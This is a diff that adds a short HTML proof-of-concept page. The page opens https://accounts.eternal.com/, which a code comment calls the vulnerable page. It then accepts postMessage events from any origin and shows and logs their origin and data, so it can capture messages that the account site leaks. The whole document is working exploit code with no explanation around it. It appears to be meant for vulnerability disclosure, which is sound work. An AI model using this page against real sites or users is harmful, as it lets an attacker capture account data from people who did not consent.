@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+    <html>
+    <head><title>PoC</title></head>
+    <body>
+    <h2>Listening for postMessage...</h2>
+    <pre id="output">Waiting...</pre>
+    <script>
+    window.addEventListener('message', function(event) {
+        document.getElementById('output').innerText = 
+            'ORIGIN: ' + event.origin + '\n' +
+            'DATA: ' + JSON.stringify(event.data);
+        console.log('Received:', event.data, 'from', event.origin);
+    });
+    
+    // Open the vulnerable page
+    var w = window.open('https://accounts.eternal.com/');
+    </script>
+    </body>
+    </html>
